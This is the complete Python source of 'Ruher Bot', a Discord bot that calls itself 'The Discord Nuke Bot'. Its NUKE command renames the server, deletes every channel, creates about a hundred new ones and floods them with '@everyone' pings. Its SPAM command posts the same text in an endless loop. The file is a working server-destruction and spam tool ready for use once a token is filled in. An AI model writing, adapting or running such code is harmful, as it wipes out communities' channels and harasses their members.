import discord
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore, Back, Style





#▒█▀▀█ █░░█ █░░█ █▀▀ █▀▀█     ▒█▀▀█ █▀▀█ ▀▀█▀▀ 
#▒█▄▄▀ █░░█ █▀▀█ █▀▀ █▄▄▀     ▒█▀▀▄ █░░█ ░░█░░ 
#▒█░▒█ ░▀▀▀ ▀░░▀ ▀▀▀ ▀░▀▀     ▒█▄▄█ ▀▀▀▀ ░░▀░░


token=''# Token Here
text_to_spam='@everyone ' # Text To Spam




colorama.init(autoreset=True)
print(f'{Fore.RED}   ▒█▀▀█ █░░█ █░░█ █▀▀ █▀▀█     ▒█▀▀█ █▀▀█ ▀▀█▀▀')
print(f'{Fore.RED}   ▒█▄▄▀ █░░█ █▀▀█ █▀▀ █▄▄▀     ▒█▀▀▄ █░░█ ░░█░░')
print(f'{Fore.RED}   ▒█░▒█ ░▀▀▀ ▀░░▀ ▀▀▀ ▀░▀▀     ▒█▄▄█ ▀▀▀▀ ░░▀░░')
print()
print(f'{Fore.GREEN}          ~~~~~~~~~~~~~~~~~~~~~~~~~~~   ')
print()
print(f'{Fore.GREEN}                  Ruher Bot             ')
print(f'{Fore.GREEN}              The Discord Nuke Bot      ')
print(f'{Fore.GREEN}                   Help: r!HELP         ')
print(f'{Fore.GREEN}                Credits: r!CREDITS      ')

client = commands.Bot(command_prefix='r!')
n=0

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game('Ruher Bot | Type r!HELP to help.'))
    print(f'{Fore.YELLOW}              Bot Status: On-Line      ')
    print()
    print(f'{Fore.GREEN}          ~~~~~~~~~~~~~~~~~~~~~~~~~~~   ')

@client.command(pass_context=True)
async def HELP(ctx):
    embed = discord.Embed(colour = discord.Colour.green())
    embed.set_author(name='Ruher Bot HELP')
    embed.add_field(name='r!NUKE', value='Is Activate A Nuke', inline=False)
    embed.add_field(name='r!SPAM', value='Is Activate A Spam', inline=False)
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def CREDITS(ctx):
    embed = discord.Embed(colour = discord.Colour.red())
    embed.set_author(name='Ruher Bot CREDITS')
    embed.add_field(name='bruh_#7913', value='The Scripter and owner', inline=False)
    await ctx.send(embed=embed)

@client.command()
async def NUKE(ctx):
    await ctx.guild.edit(name='hehe')

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0

    while(n<=100):
        await guild.create_text_channel('ruher')
        n = n+1

    for c in ctx.guild.text_channels:
        await c.send(text_to_spam)
        await c.send(text_to_spam)
        await c.send(text_to_spam)


@client.command()
async def SPAM(ctx):
    while True:
        await ctx.send(text_to_spam)

client.run(token)
